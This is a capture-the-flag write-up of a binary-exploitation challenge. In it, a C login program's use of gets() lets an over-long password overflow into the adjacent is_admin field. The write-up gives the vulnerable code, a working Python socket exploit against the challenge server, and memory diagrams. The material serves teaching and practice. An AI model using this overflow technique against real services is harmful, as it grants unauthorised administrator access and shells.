# CTF: Login Form — Buffer Overflow (Pwn)

**Category:** Binary Exploitation (Pwn)  
**Platform:** CyberHero Playground  
**Tools:** Python 3, socket  

---

## Challenge Description

A compiled C binary (`login_form`) is running on a remote server. The binary simulates a login/registration system. The goal is to exploit a memory vulnerability to gain admin access and retrieve a shell where the flag can be read.

**Provided files:** `source.c`, `login_form`, `Dockerfile`, `build-docker.sh`

---

## Vulnerability Analysis

Reading `source.c` reveals two critical issues:

### 1. Use of `gets()` — no bounds checking

```c
gets(users[ci].name);
gets(users[ci].password);
```

`gets()` reads input with no length limit, making it inherently unsafe. It was removed from the C standard in C11 for this exact reason.

### 2. Struct memory layout — off-by-one overflow

The `user` struct is defined as:

```c
struct user
{
    char name[32];      // offset 0  — 32 bytes
    char password[32];  // offset 32 — 32 bytes
    int is_admin;       // offset 64 — 4 bytes
};
```

The `password` field is exactly 32 bytes. Writing **33 or more bytes** into `password` overflows into the first byte of `is_admin`. Since `is_admin` is checked with a simple truth test:

```c
if (users[i].is_admin)
```

Any non-zero value triggers admin access. The character `'A'` (0x41) is non-zero, so writing 33 `'A'` characters overwrites `is_admin` with `0x41` — granting admin privileges.

---

## Exploit

The exploit connects to the remote server via a raw TCP socket, registers a user with an overflowing password, then logs in with the same credentials to trigger the admin check.

```python
import socket, time, threading

s = socket.socket()
s.connect(("login-form.playground.cyberhero.rs", 9005))
s.settimeout(None)

def reader():
    while True:
        try:
            data = s.recv(4096)
            if not data: break
            print(data.decode(errors='replace'), end='', flush=True)
        except: break

t = threading.Thread(target=reader, daemon=True)
t.start()

time.sleep(0.5)
s.send(b"1\n")           # Choose: Register
time.sleep(0.3)
s.send(b"hacker\n")      # Username
time.sleep(0.3)
s.send(b"A" * 33 + b"\n")  # 33 bytes overflow password into is_admin
time.sleep(0.3)
s.send(b"2\n")           # Choose: Login
time.sleep(0.3)
s.send(b"hacker\n")      # Same username
time.sleep(0.3)
s.send(b"A" * 33 + b"\n")  # Same overflowed password
time.sleep(1)

# Interactive shell
while True:
    cmd = input()
    s.send((cmd + "\n").encode())
```

### Why it works — memory layout visualization

```
users[0] in memory:
┌──────────────────────────────────┐
│ name[32]     "hacker\0..."       │  bytes 0–31
├──────────────────────────────────┤
│ password[32] "AAAA...AAA\0"      │  bytes 32–63  (32 A's fit)
├──────────────────────────────────┤
│ is_admin     0x00000000          │  bytes 64–67
└──────────────────────────────────┘

After sending 33 A's:
┌──────────────────────────────────┐
│ name[32]     "hacker\0..."       │  bytes 0–31
├──────────────────────────────────┤
│ password[32] "AAAA...AAAA"       │  bytes 32–63  (32 A's fill the buffer)
├──────────────────────────────────┤
│ is_admin     0x00000041  ← 'A'   │  byte 64 overwritten → non-zero = admin!
└──────────────────────────────────┘
```

---

## Execution

```bash
python3 exploit.py
```

Expected output:
```
====== LOGIN FORM ======
1 - Register
2 - Login
>> You are registered!

====== LOGIN FORM ======
1 - Register
2 - Login
>> Welcome admin! Here is your shell:
$ cat flag.txt
SCC{...}
```

---

## Lessons Learned

- `gets()` is dangerous and should never be used — use `fgets()` with an explicit size limit instead
- In C, struct fields are laid out contiguously in memory — overflowing one field can corrupt adjacent fields
- Off-by-one overflows are subtle but impactful: a single extra byte can change program logic entirely
- Even without defeating ASLR or crafting ROP chains, simple memory corruption can lead to full shell access
- Always validate input length server-side, regardless of what the client sends
